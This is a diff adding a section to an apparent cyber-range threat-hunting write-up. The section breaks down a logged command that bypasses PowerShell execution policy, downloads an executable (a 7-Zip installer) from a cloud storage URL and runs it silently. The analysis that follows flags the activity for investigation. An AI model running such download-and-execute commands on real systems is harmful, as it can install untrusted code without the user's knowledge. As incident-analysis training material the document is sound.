@@ -94,4 +94,30 @@ Per company policy, any device isolated by the "No AI detection" rule requires a
 
 ![Screenshot 2025-04-16 231558](https://github.com/user-attachments/assets/c9063411-2d64-4db7-8ea2-ad7731cf5c38)
 
+### **Explanation of the Command:**
+
+```bash
+cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
+```
+
+This command runs a PowerShell script through the command line (cmd.exe). It can be broken down into the following steps:
+
+1. **Invoke-WebRequest**:  
+   - Downloads a file from the URL `https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe` and saves it as `7z2408-x64.exe` in the `C:\ProgramData` directory.
+   
+2. **Start-Process**:  
+   - Executes the downloaded file (`7z2408-x64.exe`) from the `C:\ProgramData` folder.  
+   - The `-ArgumentList '/S'` part ensures the installer runs silently (without user interaction).  
+   - The `-Wait` argument makes PowerShell wait until the installation is complete before proceeding with any further steps.
+
+### **Key Highlights**:
+- This command downloads the **7-Zip** installer (`7z2408-x64.exe`) from the internet.
+- The installer is saved in the `C:\ProgramData` folder (a common location for system-level software).
+- The installer runs silently with the `/S` argument, meaning no user input is required during installation.
+- The command executes the file immediately after downloading.
+
+---
+
+This activity could indicate an attempt to install software from an external source, which should be investigated further to ensure it aligns with company security policies and guidelines.
+
 
